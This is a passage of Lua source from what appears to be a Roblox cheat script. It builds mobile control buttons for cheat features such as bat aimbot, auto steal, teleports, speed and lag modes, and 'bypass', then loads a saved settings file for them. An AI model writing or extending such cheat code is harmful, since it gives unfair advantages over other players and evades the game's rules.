        check.Text = (tostring(batThemeMode) == name) and "✓" or ""
        pcall(function() if registerAccentHook then registerAccentHook(function(a) check.TextColor3 = a end, check) end end)
        row.MouseButton1Click:Connect(function()
            if applyBatTheme then
                pcall(applyBatTheme, name)
            else
                batThemeMode = name
                if refreshBatToolTheme then pcall(refreshBatToolTheme) end
            end
            currentLbl.Text = "Current: " .. tostring(batThemeMode or name)
            for _, child in ipairs(body:GetChildren()) do
                if child:IsA("TextButton") then
                    local mark = child:FindFirstChild("Check")
                    local nameLbl
                    for _, d in ipairs(child:GetChildren()) do
                        if d:IsA("TextLabel") and d.Name ~= "Check" and d.TextXAlignment == Enum.TextXAlignment.Left then
                            nameLbl = d
                        end
                    end
                    if mark and nameLbl then
                        mark.Text = (tostring(batThemeMode) == nameLbl.Text) and "✓" or ""
                    end
                end
            end
            if saveConfig then pcall(saveConfig) end
        end)
    end
end

function buildMobileButtons()
    destroyMobileButtons(); if not mobileButtonsEnabled then return end

    local mobGui = Instance.new("ScreenGui")
    mobGui.Name = "OceanMobileButtons"
    mobGui.ResetOnSpawn = false
    mobGui.DisplayOrder = 250000
    mobGui.IgnoreGuiInset = true
    mobGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    protectGui(mobGui)
    parentGui(mobGui)
    mobGuiRef = mobGui

    local usePanel = (tostring(mobileButtonsLayout or "panel"):lower() ~= "individual")
    local defaultSize = UIS.TouchEnabled and 50 or 56
    local BTN_W = math.clamp(tonumber(mobileButtonsSize) or defaultSize, 40, 120)
    local BTN_H = math.floor(BTN_W * 0.78)
    local BTN_GAP = usePanel and 5 or 6
    local COLS = 2
    local BASE_X = 8
    local BASE_Y_OFFSET = usePanel and 16 or 72
    local PAD = usePanel and 8 or 0

    local stackDefs = {
        {key="drop",       label="DROP\nBR",      toggle=false},
        {key="instantReset", label="RESET",      toggle=false},
        {key="autoLeft",   label="AUTO\nLEFT",    toggle=true},
        {key="autoRight",  label="AUTO\nRIGHT",   toggle=true},
        {key="autoBat",    label="BAT\nAIMBOT",   toggle=true},
        {key="tpDown",     label="TP\nDOWN",      toggle=false},
        {key="carrySpeed", label="CARRY\nSPEED",  toggle=true},
        {key="lagger",     label="LAGGER\nSPEED", toggle=true},
        {key="tpBat",      label="TP\nBAT",       toggle=true},
    }

    local panelFrame = nil
    if usePanel then
        local rows = math.ceil(#stackDefs / COLS)
        local innerW = COLS * BTN_W + (COLS - 1) * BTN_GAP
        local innerH = rows * BTN_H + (rows - 1) * BTN_GAP
        local panelW = innerW + PAD * 2
        local panelH = innerH + PAD * 2
        panelFrame = Instance.new("Frame", mobGui)
        panelFrame.Name = "MobilePanel"
        panelFrame.Size = UDim2.fromOffset(panelW, panelH)
        local savedPanel = (loadBtnPositions() or {})["__panel"]
        if savedPanel and type(savedPanel.xo) == "number" then
            panelFrame.Position = UDim2.new(savedPanel.xs or 0, savedPanel.xo, savedPanel.ys or 1, savedPanel.yo or -(panelH + 20))
        else
            panelFrame.Position = UDim2.new(0, 10, 1, -(panelH + 24))
        end
        panelFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
        panelFrame.BackgroundTransparency = 0.12
        panelFrame.BorderSizePixel = 0
        panelFrame.Active = true
        panelFrame.ZIndex = 110
        Instance.new("UICorner", panelFrame).CornerRadius = UDim.new(0, 14)
        local pst = Instance.new("UIStroke", panelFrame)
        pst.Color = ACCENT_COLOR
        pst.Thickness = 1.6
        pst.Transparency = 0.25
        pcall(function() registerAccentHook(function(a) pst.Color = a end, panelFrame) end)
    end

    local rows = math.ceil(#stackDefs / COLS)
    local GRID_H = rows * (BTN_H + BTN_GAP) - BTN_GAP
    local savedPos = loadBtnPositions() or {}

    local function makeDrag(target, handle)
        local st = {dn=false, sp=nil, fp=nil, wd=false, _lastWasDrag=false, inputObj=nil}
        local DRAG_PX = 22 -- higher = easier taps on mobile (finger wobble ignored)
        local function endDrag(i)
            if not st.dn then return end
            if i and st.inputObj and i ~= st.inputObj then return end
            if st.wd then
                st._lastWasDrag = true
                pcall(saveBtnPositions)
                task.delay(0.12, function() st._lastWasDrag = false end)
            end
            st.dn = false
            st.wd = false
            st.inputObj = nil
            st.sp, st.fp = nil, nil
        end
        handle.InputBegan:Connect(function(i)
            if mobileButtonsLocked then
                st.dn = false
                return
            end
            if i.UserInputType ~= Enum.UserInputType.MouseButton1 and i.UserInputType ~= Enum.UserInputType.Touch then return end
            st.dn = true
            st.wd = false
            st._lastWasDrag = false
            st.sp = i.Position
            st.fp = target.Position
            st.inputObj = i
        end)
        UIS.InputChanged:Connect(function(i)
            if mobileButtonsLocked then
                if st.dn then
                    st.dn = false
                    st.wd = false
                    st.inputObj = nil
                    st.sp, st.fp = nil, nil
                end
                return
            end
            if not st.dn or not st.sp or not st.fp then return end
            if i.UserInputType ~= Enum.UserInputType.MouseMovement and i.UserInputType ~= Enum.UserInputType.Touch then return end
            if st.inputObj and i.UserInputType == Enum.UserInputType.Touch and i ~= st.inputObj then return end
            local dx = i.Position.X - st.sp.X
            local dy = i.Position.Y - st.sp.Y
            if math.abs(dx) > DRAG_PX or math.abs(dy) > DRAG_PX then
                st.wd = true
                target.Position = UDim2.new(st.fp.X.Scale, st.fp.X.Offset + dx, st.fp.Y.Scale, st.fp.Y.Offset + dy)
            end
        end)
        handle.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                endDrag(i)
            end
        end)
        UIS.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                endDrag(i)
            end
        end)
        return st
    end

    -- Standalone lock button
    local lockFrame = Instance.new("Frame", mobGui)
    lockFrame.Name = "SBtnLock"
    lockFrame.Size = UDim2.new(0, 30, 0, 30)
    if savedPos["__lock"] and type(savedPos["__lock"].xo) == "number" then
        local p = savedPos["__lock"]
        lockFrame.Position = UDim2.new(p.xs or 0, p.xo or 0, p.ys or 1, p.yo or -(GRID_H + BASE_Y_OFFSET + 40))
    else
        lockFrame.Position = UDim2.new(0, BASE_X, 1, -(GRID_H + BASE_Y_OFFSET + 40))
    end
    lockFrame.BackgroundColor3 = mobileButtonsLocked and Color3.fromRGB(40,40,45) or Color3.fromRGB(12,12,14)
    lockFrame.BorderSizePixel = 0
    lockFrame.Active = true
    lockFrame.ZIndex = 113
    Instance.new("UICorner", lockFrame).CornerRadius = UDim.new(1, 0)
    local lockStroke = Instance.new("UIStroke", lockFrame)
    lockStroke.Color = Color3.fromRGB(55,55,60)
    lockStroke.Thickness = 1.2
    local lockBtn = Instance.new("TextButton", lockFrame)
    lockBtn.Size = UDim2.new(1, 0, 1, 0)
    lockBtn.BackgroundTransparency = 1
    lockBtn.Text = mobileButtonsLocked and "🔒" or "🔓"
    lockBtn.TextColor3 = Color3.fromRGB(255,255,255)
    lockBtn.Font = Enum.Font.GothamBold
    lockBtn.TextSize = 13
    lockBtn.BorderSizePixel = 0
    lockBtn.AutoButtonColor = false
    lockBtn.ZIndex = 114
    lockButtonRef = lockBtn
    lockButtonFrameRef = lockFrame
    lockBtn.MouseButton1Click:Connect(function()
        mobileButtonsLocked = not mobileButtonsLocked
        updateLockButton()
        if saveConfig then pcall(saveConfig) end
    end)
    makeDrag(lockFrame, lockBtn)

    local Q_OFF = Color3.fromRGB(12, 12, 14)
    local Q_BORDER = Color3.fromRGB(45, 45, 50)
    local Q_TEXT = Color3.fromRGB(240, 240, 245)

    local shape = tostring(mobileButtonShape or "rounded"):lower()
    if circleButtonsEnabled and shape == "rounded" then shape = "circle" end
    -- per-shape size
    local SHAPE_H = BTN_H
    local SHAPE_W = BTN_W
    if shape == "circle" or shape == "hexagon" or shape == "pentagon" then
        SHAPE_W = BTN_W
        SHAPE_H = BTN_W -- square footprint
    elseif shape == "oval" then
        SHAPE_W = BTN_W
        SHAPE_H = math.floor(BTN_W * 0.55)
    elseif shape == "square" then
        SHAPE_W = BTN_W
        SHAPE_H = BTN_W
    end
    -- recalc grid height for this shape
    GRID_H = rows * (SHAPE_H + BTN_GAP) - BTN_GAP

    local function clearShapeKids(frame)
        for _, ch in ipairs(frame:GetChildren()) do
            if ch:GetAttribute("ShapePart") then pcall(function() ch:Destroy() end) end
        end
    end

    local function applyButtonShape(frame, fillColor, strokeObj)
        clearShapeKids(frame)
        local existingCorner = frame:FindFirstChildOfClass("UICorner")
        if existingCorner then existingCorner:Destroy() end
        frame.BackgroundTransparency = 0
        frame.BackgroundColor3 = fillColor

        if shape == "circle" then
            local c = Instance.new("UICorner")
            c.CornerRadius = UDim.new(1, 0)
            c.Parent = frame
        elseif shape == "oval" then
            local c = Instance.new("UICorner")
            c.CornerRadius = UDim.new(1, 0)
            c.Parent = frame
        elseif shape == "square" then
            local c = Instance.new("UICorner")
            c.CornerRadius = UDim.new(0, 4)
            c.Parent = frame
        elseif shape == "hexagon" then
            -- 3 rotated bars = hexagon silhouette
            frame.BackgroundTransparency = 1
            if strokeObj then strokeObj.Transparency = 1 end
            local function bar(rot)
                local f = Instance.new("Frame")
                f:SetAttribute("ShapePart", true)
                f.AnchorPoint = Vector2.new(0.5, 0.5)
                f.Position = UDim2.fromScale(0.5, 0.5)
                f.Size = UDim2.new(1, 0, 0.58, 0)
                f.Rotation = rot
                f.BackgroundColor3 = fillColor
                f.BorderSizePixel = 0
                f.Active = false
                f.ZIndex = frame.ZIndex
                f.Parent = frame
                return f
            end
            bar(0); bar(60); bar(-60)
        elseif shape == "pentagon" then
            frame.BackgroundTransparency = 1
            if strokeObj then strokeObj.Transparency = 1 end
            local function bar(rot, hScale)
                local f = Instance.new("Frame")
                f:SetAttribute("ShapePart", true)
                f.AnchorPoint = Vector2.new(0.5, 0.5)
                f.Position = UDim2.fromScale(0.5, 0.5)
                f.Size = UDim2.new(1, 0, hScale or 0.55, 0)
                f.Rotation = rot
                f.BackgroundColor3 = fillColor
                f.BorderSizePixel = 0
                f.Active = false
                f.ZIndex = frame.ZIndex
                f.Parent = frame
                local c = Instance.new("UICorner")
                c.CornerRadius = UDim.new(0, 6)
                c.Parent = f
                return f
            end
            bar(0, 0.62); bar(36, 0.58); bar(-36, 0.58); bar(72, 0.5); bar(-72, 0.5)
        else -- rounded default
            local c = Instance.new("UICorner")
            c.CornerRadius = UDim.new(0, 12)
            c.Parent = frame
        end
    end

    local function makeStackBtn(def, index)
        local col = (index - 1) % COLS
        local rowN = math.floor((index - 1) / COLS)
        local defX = BASE_X + col * (SHAPE_W + BTN_GAP)
        local defY = -(GRID_H + BASE_Y_OFFSET) + rowN * (SHAPE_H + BTN_GAP)

        local parentBtn = (usePanel and panelFrame) or mobGui
        local frame = Instance.new("Frame", parentBtn)
        frame.Name = "SBtn_" .. def.key
        frame.Size = UDim2.new(0, SHAPE_W, 0, SHAPE_H)
        if usePanel then
            frame.Position = UDim2.fromOffset(PAD + col * (SHAPE_W + BTN_GAP), PAD + rowN * (SHAPE_H + BTN_GAP))
        elseif savedPos[def.key] then
            local p = savedPos[def.key]
            frame.Position = UDim2.new(p.xs or 0, p.xo or defX, p.ys or 1, p.yo or defY)
        else
            frame.Position = UDim2.new(0, defX, 1, defY)
        end
        frame.BackgroundColor3 = Q_OFF
        frame.BorderSizePixel = 0
        frame.Active = true
        frame.ZIndex = 119
        local stroke = Instance.new("UIStroke", frame)
        stroke.Color = Q_BORDER
        stroke.Thickness = 1.5
        applyButtonShape(frame, Q_OFF, stroke)

        local bgImg = nil
        do
            local imgId = tostring(mobBtnBgId or ""):gsub("%s+",""):gsub("rbxassetid://","")
            if imgId == "" then
                imgId = tostring(customBgId or ""):gsub("%s+",""):gsub("rbxassetid://","")
            end
            if imgId == "" then
                imgId = tostring(customBgId or ""):gsub("rbxassetid://","")
            end
            if imgId ~= "" and tonumber(imgId) then
                frame.BackgroundTransparency = 0.35
                bgImg = Instance.new("ImageLabel")
                bgImg.Name = "BtnBgImage"
                bgImg.BackgroundTransparency = 1
                bgImg.Image = "rbxthumb://type=Asset&id=" .. imgId .. "&w=150&h=150"
                bgImg.ScaleType = Enum.ScaleType.Crop
                bgImg.Size = UDim2.fromScale(1, 1)
                bgImg.ZIndex = frame.ZIndex
                bgImg.Parent = frame
                -- match corner radius
                local c = Instance.new("UICorner")
                if shape == "circle" then
                    c.CornerRadius = UDim.new(1, 0)
                elseif shape == "oval" then
                    c.CornerRadius = UDim.new(1, 0)
                else
                    c.CornerRadius = UDim.new(0, 12)
                end
                c.Parent = bgImg
            end
        end

        local btn = Instance.new("TextButton", frame)
        btn.Size = UDim2.new(1, 0, 1, 0)
        btn.BackgroundTransparency = 1
        btn.Text = def.label
        btn.TextColor3 = Q_TEXT
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = (SHAPE_W >= 70) and 11 or 9
        btn.TextWrapped = true
        btn.TextWrapped = true
        btn.BorderSizePixel = 0
        btn.AutoButtonColor = false
        btn.ZIndex = 120

        local isOn = false
        local function paint(s)
            local col = s and ACCENT_COLOR or Q_OFF
            local ti = TweenInfo.new(0.15, Enum.EasingStyle.Quad)
            if shape == "hexagon" or shape == "pentagon" then
                frame.BackgroundTransparency = 1
                for _, ch in ipairs(frame:GetChildren()) do
                    if ch:GetAttribute("ShapePart") and ch:IsA("Frame") then
                        TweenService:Create(ch, ti, {BackgroundColor3 = col}):Play()
                    end
                end
                if stroke then stroke.Transparency = 1 end
            else
                local targetTrans = bgImg and (s and 0.15 or 0.35) or 0
                TweenService:Create(frame, ti, {BackgroundColor3 = col, BackgroundTransparency = targetTrans}):Play()
                if stroke then
                    stroke.Transparency = 0
                    TweenService:Create(stroke, ti, {Color = s and ACCENT_COLOR or Q_BORDER}):Play()
                end
            end
            if bgImg then
                TweenService:Create(bgImg, ti, {ImageTransparency = s and 0.05 or 0.25}):Play()
            end
            btn.TextColor3 = s and accentTextColor3(ACCENT_COLOR) or Q_TEXT
        end
        local function setter(s)
            isOn = not not s
            paint(isOn)
        end
        registerAccentHook(function(a)
            if isOn then
                if shape == "hexagon" or shape == "pentagon" then
                    for _, ch in ipairs(frame:GetChildren()) do
                        if ch:GetAttribute("ShapePart") and ch:IsA("Frame") then
                            ch.BackgroundColor3 = a
                        end
                    end
                else
                    frame.BackgroundColor3 = a
                    if stroke then stroke.Color = a end
                end
                btn.TextColor3 = accentTextColor3(a)
            end
        end, frame)

        local function onAction(state)
            if def.key == "tpBat" then
                if state then
                    if isHoldingCarryTool and isHoldingCarryTool() then setter(false); return end
                    TPBat.start()
                else
                    TPBat.stop()
                end
                if saveConfig then pcall(saveConfig) end
                return
            end
            if def.key == "drop" then
                runDrop()
            elseif def.key == "instantReset" then
                if doInstantReset then doInstantReset() end
            elseif def.key == "autoLeft" then
                if state then
                    if autoRightEnabled then autoRightEnabled=false; stopAutoRight(); if autoRightSetVisual then autoRightSetVisual(false) end; if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end end
                    if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end; if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
                    autoLeftEnabled = true; startAutoLeft()
                    if autoLeftSetVisual then autoLeftSetVisual(true) end
                else
                    autoLeftEnabled = false; stopAutoLeft()
                    if autoLeftSetVisual then autoLeftSetVisual(false) end
                end
                if saveConfig then pcall(saveConfig) end
            elseif def.key == "autoBat" then
                if state then
                    if isHoldingCarryTool and isHoldingCarryTool() then setter(false); return end
                    if autoLeftEnabled then autoLeftEnabled=false; stopAutoLeft(); if autoLeftSetVisual then autoLeftSetVisual(false) end; if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end end
                    if autoRightEnabled then autoRightEnabled=false; stopAutoRight(); if autoRightSetVisual then autoRightSetVisual(false) end; if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end end
                    queueAutoBatStart()
                    if autoBatSetVisual then autoBatSetVisual(true) end
                else
                    stopBatAimbot()
                    if autoBatSetVisual then autoBatSetVisual(false) end
                end
                if saveConfig then pcall(saveConfig) end
            elseif def.key == "autoRight" then
                if state then
                    if autoLeftEnabled then autoLeftEnabled=false; stopAutoLeft(); if autoLeftSetVisual then autoLeftSetVisual(false) end; if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end end
                    if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end; if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
                    autoRightEnabled = true; startAutoRight()
                    if autoRightSetVisual then autoRightSetVisual(true) end
                else
                    autoRightEnabled = false; stopAutoRight()
                    if autoRightSetVisual then autoRightSetVisual(false) end
                end
                if saveConfig then pcall(saveConfig) end
            elseif def.key == "tpDown" then
                runTPFloor()
            elseif def.key == "carrySpeed" then
                if toggleCarryMode then toggleCarryMode() end
                if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
                if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
                if saveConfig then pcall(saveConfig) end
            elseif def.key == "lagger" then
                if toggleLaggerMode then toggleLaggerMode() end
                if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
                if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
                if saveConfig then pcall(saveConfig) end
            end
        end

        local dragState
        if usePanel and panelFrame then
            dragState = makeDrag(panelFrame, btn)
        else
            dragState = makeDrag(frame, btn)
        end
        local lastFire = 0
        local function fireClick()
            if dragState and (dragState._lastWasDrag or dragState.wd) then
                return
            end
            local now = tick()
            if now - lastFire < 0.2 then return end
            lastFire = now
            if def.toggle then
                isOn = not isOn
                paint(isOn)
                pcall(onAction, isOn)
            else
                paint(true)
                task.delay(0.18, function() if frame and frame.Parent then paint(false) end end)
                pcall(onAction)
            end
        end
        btn.Active = true
        btn.Selectable = true
        frame.Active = true
        -- Primary: Activated
        pcall(function() btn.Activated:Connect(fireClick) end)
        -- Desktop click
        btn.MouseButton1Click:Connect(fireClick)
        local touchDownAt, touchPos = nil, nil
        btn.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.Touch or i.UserInputType == Enum.UserInputType.MouseButton1 then
                touchDownAt = tick()
                touchPos = i.Position
            end
        end)
        btn.InputEnded:Connect(function(i)
            if i.UserInputType ~= Enum.UserInputType.Touch and i.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
            if not touchDownAt then return end
            local held = tick() - touchDownAt
            touchDownAt = nil
            if held > 0.45 then return end -- long press = ignore
            if dragState and (dragState.wd or dragState._lastWasDrag) then return end
            if touchPos then
                local dx = math.abs(i.Position.X - touchPos.X)
                local dy = math.abs(i.Position.Y - touchPos.Y)
                if dx > 18 or dy > 18 then return end
            end
            fireClick()
        end)
        mobBtnRefs[def.key] = setter
        return frame, setter
    end

    if usePanel and panelFrame then
        makeDrag(panelFrame, panelFrame)
    end
    for i, def in ipairs(stackDefs) do
        makeStackBtn(def, i)
    end

    if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(autoLeftEnabled) end
    if mobBtnRefs.autoRight then mobBtnRefs.autoRight(autoRightEnabled) end
    if mobBtnRefs.autoBat then mobBtnRefs.autoBat(autoBatEnabled) end
    if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
    if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
    if mobBtnRefs.tpBat then mobBtnRefs.tpBat(TPBat.enabled) end
    TPBat.setVisual = function(v) if mobBtnRefs.tpBat then mobBtnRefs.tpBat(v) end end
end

pcall(function()
    if not(isfile and isfile(CONFIG_FILE)) then
        _configFullyLoaded = true
        return
    end
    local ok,d=pcall(function() return HS:JSONDecode(readfile(CONFIG_FILE)) end)
    if not(ok and type(d)=="table") then
        _configFullyLoaded = true
        return
    end
    if type(d.normalSpeed)=="number" and d.normalSpeed>0 then NS=d.normalSpeed end
    if type(d.aimbotSpeed)=="number" and d.aimbotSpeed>0 then aimbotSpeed=d.aimbotSpeed end
    if type(d.carrySpeed)=="number" and d.carrySpeed>0 then CS=d.carrySpeed end
    if type(d.laggerSpeed)=="number" and d.laggerSpeed>0 then LAGGER_SPEED=d.laggerSpeed end
    if type(d.laggerCarrySpeed)=="number" and d.laggerCarrySpeed>0 then LAGGER_CARRY_SPEED=d.laggerCarrySpeed end
    if type(d.carrySpeedActive)=="boolean" then carrySpeedActive=d.carrySpeedActive end
    if type(d.laggerModeEnabled)=="boolean" then laggerModeEnabled=d.laggerModeEnabled end
    if type(d.autoLeft)=="boolean" then autoLeftEnabled=d.autoLeft end
    if type(d.autoRight)=="boolean" then autoRightEnabled=d.autoRight end
    if type(d.autoBat)=="boolean" then autoBatEnabled=d.autoBat end
    if type(d.antiRagdoll)=="boolean" then antiRagdollEnabled=d.antiRagdoll end
    if type(d.antiDieEnabled)=="boolean" then antiDieEnabled=d.antiDieEnabled end
    if type(d.infiniteJump)=="boolean" then infJumpEnabled=d.infiniteJump end
    if type(d.infJumpMode)=="string" then infJumpMode=d.infJumpMode end
    if type(d.medusaCounter)=="boolean" then medusaCounterEnabled=d.medusaCounter end
    if type(d.batCounter)=="boolean" then batCounterEnabled=d.batCounter end
    if type(d.autoStealEnabled)=="boolean" then Steal.AutoStealEnabled=d.autoStealEnabled end
    if type(d.stealMode)=="string" and (d.stealMode=="normal" or d.stealMode=="semi") then stealMode=d.stealMode end
    if type(d.normalStealVersion)=="string" and NORMAL_STEAL_PERCENT[d.normalStealVersion] then normalStealVersion=d.normalStealVersion end
    if applyStealModeParams then pcall(applyStealModeParams) end
    if type(d.grabRadius)=="number" then Steal.StealRadius=d.grabRadius end
    if type(d.stealDuration)=="number" then Steal.StealDuration=d.stealDuration end
    if type(d.autoSwing)=="boolean" then autoSwingEnabled=d.autoSwing end
    if type(d.unwalkEnabled)=="boolean" then unwalkEnabled=d.unwalkEnabled end
    if type(d.antiLag)=="boolean" then antiLagEnabled=d.antiLag end
    if type(d.stretchRez)=="boolean" then stretchRezEnabled=d.stretchRez end
    if type(d.autoTPEnabled)=="boolean" then autoTPEnabled=d.autoTPEnabled end
    if type(d.autoTPHeight)=="number" then autoTPHeight=d.autoTPHeight end
    if type(d.fovValue)=="number" then fovValue=d.fovValue end
    if type(d.fovIndex)=="number" then fovIndex=math.clamp(math.floor(d.fovIndex),1,#fovOptions) end
    if type(d.uiScale)=="number" then uiScaleValue=math.clamp(d.uiScale,0.5,1.5) end
    if type(d.uiThemeIndex)=="number" then uiThemeIndex=math.clamp(math.floor(d.uiThemeIndex),1,#UI_THEMES) end
    if type(d.uiLayoutMode)=="number" then uiLayoutMode=math.clamp(math.floor(d.uiLayoutMode),1,4) end
    if type(d.skyTheme)=="string" then currentSkyTheme=d.skyTheme end
    if type(d.keys)=="table" then _SavedGuiKeys=d.keys end
    if type(d.autoMoveSwing)=="boolean" then autoMoveSwingEnabled=d.autoMoveSwing end
    if type(d.autoMoveSwingInterval)=="number" then autoMoveSwingInterval=d.autoMoveSwingInterval end
    if type(d.ragdollGui)=="boolean" then ragdollGuiEnabled=d.ragdollGui end
    if type(d.ragdollGuiPos)=="string" then
        ragdollGuiPos = d.ragdollGuiPos
        if ragdollGuiPos == "DOWN" or ragdollGuiPos == "CUSTOM" then
            ragdollGuiPos = "UNDER_SPEED"
        end
    end
    if type(d.batTheme)=="string" then batThemeMode=d.batTheme; if batThemeMode and batThemeMode~="Normal" and applyBatTheme then task.defer(function() applyBatTheme(batThemeMode) end) end end
    if type(d.batToolSkin)=="boolean" and d.batToolSkin and applyBatTheme then task.defer(function() applyBatTheme("Avatar") end) end
    if type(d.baseTheme)=="string" then
        local bt = d.baseTheme
        if bt == "Diamond" then bt = "Diamond" end
        if bt == "Candy" then bt = "Bubblegum" end
        if bt == "Octavian112299" or bt == "Bat" then bt = "Stars" end
        local valid = {Normal=true,Lava=true,Candy=true,Bubblegum=true,Snowy=true,Diamond=true,Ocean=true,Bat=true,["Stars"]=true,Gold=true,Romania=true,Sakura=true,Rainbow=true}
        baseThemeMode = "Normal" -- base skins removed
    end
    if type(d.mobileButtonsEnabled)=="boolean" then mobileButtonsEnabled=d.mobileButtonsEnabled end
    if type(d.mobileButtonsSize)=="number" then mobileButtonsSize=d.mobileButtonsSize end
    if type(d.mobileButtonsLayout)=="string" and (d.mobileButtonsLayout=="panel" or d.mobileButtonsLayout=="individual") then mobileButtonsLayout=d.mobileButtonsLayout end
    if type(d.circleButtonsEnabled)=="boolean" then circleButtonsEnabled=d.circleButtonsEnabled end
    if type(d.mobileButtonShape)=="string" and d.mobileButtonShape~="" then mobileButtonShape=d.mobileButtonShape end
    if circleButtonsEnabled and (not d.mobileButtonShape) then mobileButtonShape="circle" end
    if type(d.introSoundEnabled)=="boolean" then introSoundEnabled=d.introSoundEnabled end
    if type(d.introEnabled)=="boolean" then introEnabled=d.introEnabled end
    if type(d.animEnabled)=="boolean" then animEnabled=d.animEnabled end
    if type(d.selectedAnimPack)=="string" and ANIMATION_PACKS and ANIMATION_PACKS[d.selectedAnimPack] then selectedAnimPack=d.selectedAnimPack end
    if type(d.headlessEnabled)=="boolean" then headlessEnabled=d.headlessEnabled end
    if type(d.korbloxEnabled)=="boolean" then korbloxEnabled=d.korbloxEnabled end
    if type(d.korbloxLeg)=="string" and (d.korbloxLeg=="Left" or d.korbloxLeg=="Right" or d.korbloxLeg=="Both") then korbloxLeg=d.korbloxLeg end
    if type(d.blueEspEnabled)=="boolean" then blueEspEnabled=d.blueEspEnabled end
    if type(d.speedEspEnabled)=="boolean" then speedEspEnabled=d.speedEspEnabled end
    if type(d.mirrorTPDown)=="boolean" then mirrorTPDownEnabled=d.mirrorTPDown end
    aimbotMode = "v1" -- V2 removed
    if type(d.mobBtnBgId)=="string" then mobBtnBgId=d.mobBtnBgId end
    -- bypass restored
    -- lagger panel restored
    if type(d.bypassEnabled)=="boolean" then bypassEnabled=d.bypassEnabled end
    if type(d.laggerPanelEnabled)=="boolean" then laggerPanelEnabled=d.laggerPanelEnabled end
    if type(d.bypassFxEnabled)=="boolean" then bypassFxEnabled=d.bypassFxEnabled end
    if type(d.bypassFxMode)=="string" and (d.bypassFxMode=="normal" or d.bypassFxMode=="rainbow") then bypassFxMode=d.bypassFxMode end
    if type(d.bypassFxStyle)=="string" and (d.bypassFxStyle=="node" or d.bypassFxStyle=="classic" or d.bypassFxStyle=="pulse") then bypassFxStyle=d.bypassFxStyle end
    if type(d.laggerPosSX)=="number" then laggerPosSX=d.laggerPosSX end
    if type(d.laggerPosOX)=="number" then laggerPosOX=d.laggerPosOX end
    if type(d.laggerPosSY)=="number" then laggerPosSY=d.laggerPosSY end
    if type(d.laggerPosOY)=="number" then laggerPosOY=d.laggerPosOY end
    if type(d.guiPositionsSaved)=="boolean" then guiPositionsSaved=d.guiPositionsSaved end
    if type(d.hubPosSX)=="number" then hubPosSX=d.hubPosSX end
    if type(d.hubPosOX)=="number" then hubPosOX=d.hubPosOX end
    if type(d.hubPosSY)=="number" then hubPosSY=d.hubPosSY end
    if type(d.hubPosOY)=="number" then hubPosOY=d.hubPosOY end
    if type(d.bypassPosSX)=="number" then bypassPosSX=d.bypassPosSX end
    if type(d.bypassPosOX)=="number" then bypassPosOX=d.bypassPosOX end
    if type(d.bypassPosSY)=="number" then bypassPosSY=d.bypassPosSY end
    if type(d.bypassPosOY)=="number" then bypassPosOY=d.bypassPosOY end
    if type(d.autoSwitchSpeed)=="boolean" then autoSwitchSpeedEnabled=d.autoSwitchSpeed end
    if type(d.mobileButtonsLocked)=="boolean" then mobileButtonsLocked=d.mobileButtonsLocked end
    if type(d.perButtonDrag)=="boolean" then perButtonDragEnabled=d.perButtonDrag end
    if type(d.guiTransparencyEnabled)=="boolean" then guiTransparencyEnabled=d.guiTransparencyEnabled end
    if type(d.batDesyncTpEnabled)=="boolean" then TPBat.enabled=d.batDesyncTpEnabled end
    if type(d.tpBatDistance)=="number" and d.tpBatDistance>0 then tpBatDistance=d.tpBatDistance end
    if type(d.stealBarPos)=="string" then stealBarPos=d.stealBarPos end
    if type(d.stealBarCustomX)=="number" then stealBarCustomX=d.stealBarCustomX end
    if type(d.stealBarCustomY)=="number" then stealBarCustomY=d.stealBarCustomY end
        if type(d.trackerEnabled)=="boolean" then trackerEnabled=d.trackerEnabled end
    if type(d.trackerMode)=="string" then trackerMode=d.trackerMode end
    if type(d.trackerScale)=="number" then trackerScale=d.trackerScale end
    if type(d.trackerBgEnabled)=="boolean" then trackerBgEnabled=d.trackerBgEnabled end
    if type(d.trackerPosSX)=="number" then trackerPosSX=d.trackerPosSX end
    if type(d.trackerPosSY)=="number" then trackerPosSY=d.trackerPosSY end
    if type(d.trackerPosOX)=="number" then trackerPosOX=d.trackerPosOX end
    if type(d.trackerPosOY)=="number" then trackerPosOY=d.trackerPosOY end
    if type(d.highPingWarnEnabled)=="boolean" then highPingWarnEnabled=d.highPingWarnEnabled end
    if type(d.highPingThreshold)=="number" then highPingThreshold=d.highPingThreshold end
    if type(d.tpBatVersion)=="string" then tpBatVersion=d.tpBatVersion end
if type(d.watermarkEnabled)=="boolean" then watermarkEnabled=d.watermarkEnabled end
    if type(d.watermarkCustomX)=="number" then watermarkCustomX=d.watermarkCustomX end
    if type(d.watermarkCustomY)=="number" then watermarkCustomY=d.watermarkCustomY end
    if type(d.stealBarStyle)=="number" then stealBarStyle=math.clamp(math.floor(d.stealBarStyle),1,5) end
    if type(d.bodyColorMode)=="string" then bodyColorMode=d.bodyColorMode end
    if type(d.customBgId)=="string" then customBgId=d.customBgId end
    if type(d.bodyLockEnabled)=="boolean" then bodyLockEnabled=d.bodyLockEnabled end
